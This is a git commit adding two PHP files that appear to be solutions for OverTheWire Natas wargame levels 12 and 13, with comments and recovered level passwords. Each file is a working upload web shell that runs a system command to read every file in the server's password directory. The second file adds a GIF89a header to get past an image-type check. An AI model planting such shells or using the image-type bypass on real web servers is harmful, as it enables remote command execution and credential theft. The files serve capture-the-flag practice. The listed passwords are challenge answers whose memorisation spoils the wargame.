afa3096edaf4d07e968518d82fbbe20012f148c5
ballban_Jung <ballban@hotmail.com>
2024-05-26 01:14:08 +0900

    first commit

---
+++ Natas/natas12.php
@@ -0,0 +1,8 @@
+<!-- make a php file -->
+<pre><?php system('grep -i . /etc/natas_webpass/*');?></pre>
+
+<!-- 
+change the hidden input filename and upload it
+
+/etc/natas_webpass/natas12:YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
+/etc/natas_webpass/natas13:lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9 -->
---
+++ Natas/natas13.gif.php
@@ -0,0 +1,11 @@
+GIF89a
+<!-- GIF89a with this exif_imagetype will recogize this as gif-->
+<!-- make a php file -->
+<pre><?php system('grep -i . /etc/natas_webpass/*');?></pre>
+
+<!-- 
+change the hidden input filename and upload it
+
+/etc/natas_webpass/natas13:lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
+/etc/natas_webpass/natas14:qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
+-->
